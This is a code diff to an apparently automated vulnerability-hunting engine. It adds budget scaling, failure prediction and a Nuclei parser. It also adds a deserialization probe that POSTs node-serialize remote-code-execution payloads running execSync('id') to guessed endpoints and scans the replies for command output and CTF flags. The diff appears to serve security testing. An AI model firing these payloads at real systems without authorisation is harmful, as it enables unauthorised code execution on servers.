@@ -52,6 +52,9 @@ import { tmpdir } from "os";
 import { join } from "path";
 import { programs } from "../db/schema";
 import { parameterDiscovery } from "../lib/tools/parameter-discovery";
+import { parseNucleiOutput } from "../lib/parsers/nuclei-parser";
+import { failurePrediction } from "../lib/intelligence/failure-prediction";
+import { effortScaler } from "../lib/intelligence/effort-scaling";
 import { oauthProber } from "../lib/tools/oauth-probe";
 import { massAssignmentProber } from "../lib/tools/mass-assignment-probe";
 import { businessLogicProber } from "../lib/tools/business-logic-probe";
@@ -181,11 +184,16 @@ export const TOOL_KNOWLEDGE: Record<string, {
              "-json", "-silent", "-timeout", "10"],
     }),
     parser: (output) => {
-      const findings: unknown[] = [];
-      output.split("\n").filter(l => l.trim()).forEach(line => {
-        try { findings.push(JSON.parse(line)); } catch { /* skip non-JSON lines */ }
-      });
-      return { findings, count: findings.length };
+      const result = parseNucleiOutput(output);
+      return {
+        found: result.found,
+        count: result.count,
+        findings: result.matches,
+        confidence: result.confidence,
+        severity: result.highestSeverity,
+        flagValues: result.flagValues,
+        rawOutput: result.rawOutput,
+      };
     },
     rateLimit: 30,
   },
@@ -481,6 +489,7 @@ export class HunterEngine extends EventEmitter {
     maxIterations?: number;
     budget?: Partial<HuntState["budget"]>;
     focusVulnClasses?: string[];
+    goal?: string;
   }): Promise<string> {
     await this.loadCustomTools();
 
@@ -553,6 +562,16 @@ export class HunterEngine extends EventEmitter {
       programId: params.programId,
       programType: "web_app",
     });
+
+    // Effort scaling — calibrate probe budget to target complexity before loop starts
+    const effort = effortScaler.analyze(params.targetUrl, params.goal ?? "");
+    if (this.state.budget.maxRequests === 200) {
+      // Only override if still at default — let explicit overrides win
+      this.state.budget.maxRequests = effort.probeLimit;
+    }
+    logger.info("[HunterEngine] Effort profile", { complexity: effort.complexity, probeLimit: effort.probeLimit, rationale: effort.rationale });
+    contextWriter.alert("effort", { complexity: effort.complexity, probeLimit: effort.probeLimit });
+
     contextWriter.reset(sessionUuid, params.targetUrl, "ollama");
     this.emit("hunt:started", { sessionUuid, targetUrl: params.targetUrl });
     logger.info("Hunt started", { sessionUuid, targetUrl: params.targetUrl });
@@ -1448,6 +1467,16 @@ Return ONLY valid JSON array of hypothesis objects.`;
         break;
       }
 
+      // Failure prediction — skip low-probability probes early to preserve budget
+      const evidenceTags = hypothesis.evidence.flatMap(e => e.tags ?? []);
+      const complexity = failurePrediction.complexityFrom(evidenceTags, hypothesis.reasoning);
+      const prediction = failurePrediction.predict(hypothesis.vulnClass, complexity);
+      if (prediction.shouldSkip) {
+        hypothesis.status = "rejected";
+        logger.debug("[HunterEngine] Failure prediction skip", { vulnClass: hypothesis.vulnClass, reason: prediction.reason });
+        continue;
+      }
+
       hypothesis.status = "probing";
       this.emit("hunt:probing", { hypothesisId: hypothesis.id, vulnClass: hypothesis.vulnClass });
 
@@ -1456,6 +1485,33 @@ Return ONLY valid JSON array of hypothesis objects.`;
       if (!allowed) {
         hypothesis.status = "rejected";
         continue;
+      }
+
+      // Deserialization POST probe — fires before regular tool dispatch for rce hypotheses
+      if (hypothesis.vulnClass === "rce" || hypothesis.vulnClass === "deserialization") {
+        const deserialResult = await this.probeDeserialize(hypothesis.targetUrl);
+        if (deserialResult.found) {
+          const result: ProbeResult = {
+            hypothesisId: hypothesis.id,
+            tool: "deserialize_probe",
+            command: `POST ${deserialResult.endpoint}`,
+            output: deserialResult.output,
+            parsed: { found: true, vulnerable: true, rawOutput: deserialResult.output, flagValues: deserialResult.flagValues },
+            success: true,
+            duration: deserialResult.duration,
+          };
+          this.state.probes.push(result);
+          this.state.budget.requestsMade++;
+          this.rlWiring.onToolResult("deserialize_probe", hypothesis.vulnClass, true, hypothesis.confidence);
+          failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, true);
+          this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId: "direct" });
+          // Jump straight to update — hypothesis handled
+          hypothesis.status = "pending"; // let update phase confirm it
+          hypothesis.confidence = Math.min(0.95, hypothesis.confidence + 0.3);
+          (hypothesis as unknown as Record<string, unknown>)._deserialProbeHit = true;
+          (hypothesis as unknown as Record<string, unknown>)._deserialOutput = deserialResult.output;
+          continue;
+        }
       }
 
       // Select appropriate tool — honour retry hint if set, otherwise auto-select
@@ -1497,6 +1553,7 @@ Return ONLY valid JSON array of hypothesis objects.`;
       if (this.state.probes.length > MAX_PROBES) this.state.probes.shift();
       this.state.budget.requestsMade += Number(probeResult.requestsMade || 1);
       this.rlWiring.onToolResult(toolName, hypothesis.vulnClass, result.success, hypothesis.confidence);
+      failurePrediction.recordOutcome(hypothesis.vulnClass, complexity, result.success);
       const proxyId = egressAllocator.getCurrentAssignment(hypothesis.targetUrl) ?? 'direct';
       this.emit("hunt:probe_result", { hypothesisId: hypothesis.id, result, proxyId });
 
@@ -1920,6 +1977,57 @@ Return ONLY valid JSON array of hypothesis objects.`;
       logger.debug("[HunterEngine] OOB probe error (non-critical)", { err: String(err) });
       return false;
     }
+  }
+
+  private async probeDeserialize(baseUrl: string): Promise<{
+    found: boolean; output: string; endpoint: string; flagValues: string[]; duration: number;
+  }> {
+    const start = Date.now();
+    const allObs = this.state.observations.map(o => (o as unknown as Record<string, string>).rawOutput || "").join(" ");
+
+    // Discover deserialize endpoints from observations or infer from base URL
+    const endpoints: string[] = [];
+    const endpointPatterns = ["/deserializ", "/serial", "/unserializ", "/pickle", "/marshal", "/object"];
+    for (const pat of endpointPatterns) {
+      const match = allObs.match(new RegExp(`(["'/])((?:[^"'/\\s]*)?${pat.slice(1)}[^"'\\s]*)`, "i"));
+      if (match) {
+        try { endpoints.push(new URL(match[2], baseUrl).toString()); } catch { /* skip */ }
+      }
+    }
+    // Also try base URL itself and common paths
+    try {
+      const origin = new URL(baseUrl).origin;
+      endpoints.push(...["/deserialize", "/api/deserialize", "/parse", "/api/parse"].map(p => origin + p));
+    } catch { /* noop */ }
+
+    const payloads = [
+      // node-serialize IIFE
+      `{"rce":"_$$ND_FUNC$$_function(){return require('child_process').execSync('id').toString()}()"}`,
+      // process.mainModule variant
+      `{"x":"_$$ND_FUNC$$_function(){return process.mainModule.require('child_process').execSync('id').toString()}()"}`,
+    ];
+
+    const FLAG_RE = /flag\{[^}]+\}|\b[0-9a-f]{32}\b/g;
+
+    for (const endpoint of [...new Set(endpoints)]) {
+      for (const payload of payloads) {
+        try {
+          const resp = await axios.post(endpoint, payload, {
+            headers: { "Content-Type": "application/json", ...this.authHeaders },
+            timeout: 8000,
+            validateStatus: () => true,
+          });
+          const body = String(typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data));
+          const flags = body.match(FLAG_RE) ?? [];
+          const rceHit = /uid=\d+|root|executed|flag\{/i.test(body);
+          if (flags.length > 0 || rceHit) {
+            return { found: true, output: body.slice(0, 600), endpoint, flagValues: flags, duration: Date.now() - start };
+          }
+        } catch { /* try next */ }
+      }
+    }
+
+    return { found: false, output: "", endpoint: "", flagValues: [], duration: Date.now() - start };
   }
 
   private computeAnomalyScore(data: Record<string, unknown>): number {
